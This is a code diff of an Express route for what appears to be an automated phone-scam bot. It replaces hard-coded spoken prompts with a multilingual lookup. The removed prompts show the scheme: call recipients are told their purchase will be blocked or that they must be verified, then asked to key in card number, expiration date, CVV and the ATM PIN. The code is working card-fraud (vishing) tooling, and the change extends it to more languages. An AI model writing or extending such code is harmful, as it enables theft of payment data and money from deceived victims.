@@ -1,6 +1,8 @@
 import { bot } from '../..';
 import { app } from '../';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangStep } from '../../languages';
+import { Language } from '../../types';
 
 app.all('/calls/:step/:chatId/:language', async (req, res) => {
   const { cardType, isAccount, expiry, cvv, variables } = req.query;
@@ -18,15 +20,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have not entered anything. We need to verify you, please enter your ${
-              cardType !== 'undefined' ? cardType : ''
-            } ${
-              isAccount === 'yes'
-                ? 'card number'
-                : cvv === 'yes'
-                ? 'card CVV'
-                : 'card expiration date'
-            } followed by the pound key.`,
+            payload: getLangStep({
+              step: isAccount === 'yes' ? '1' : cvv === 'yes' ? '2' : '3',
+              cardType: cardType !== 'undefined' ? String(cardType) : ``,
+              dtmf,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
@@ -68,7 +67,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
+              payload: getLangStep({
+                step: `4`,
+                cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                dtmf,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -112,11 +116,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `GREAT, you have entered ${dtmf
-              .split('')
-              .join(', ')}. Please enter your ${
-              cardType !== 'undefined' ? cardType : ''
-            } card expiration date followed by the pound key.`,
+            payload: getLangStep({
+              step: `5`,
+              cardType: cardType !== 'undefined' ? String(cardType) : ``,
+              dtmf,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
@@ -158,7 +163,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The expiration date you have enter is incorrect. Please enter your ${cardType} card expiration date followed by the pound key.`,
+              payload: getLangStep({
+                step: `6`,
+                cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                dtmf,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -207,11 +217,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `GREAT, you have entered ${dtmf
-              .split('')
-              .join(', ')}. Please enter your ${
-              cardType !== 'undefined' ? cardType : ''
-            } card CVV followed by the pound key.`,
+            payload: getLangStep({
+              step: `7`,
+              cardType: cardType !== 'undefined' ? String(cardType) : ``,
+              dtmf,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
@@ -253,9 +264,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The CVV number you have entered is incorrect. Please enter your ${
-                cardType !== 'undefined' ? cardType : ''
-              } card CVV followed by the pound key.`,
+              payload: getLangStep({
+                step: `8`,
+                cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                dtmf,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -299,11 +313,12 @@ app.all('/calls/:step/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `GREAT. you have entered ${dtmf
-              .split('')
-              .join(', ')}. To AUTHENTICATE YOU please enter your ${
-              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-            }, the same pin you use at the ATM,  followed by the pound key.`,
+            payload: getLangStep({
+              step: `9`,
+              cardType: cardType !== 'undefined' ? String(cardType) : ``,
+              dtmf,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
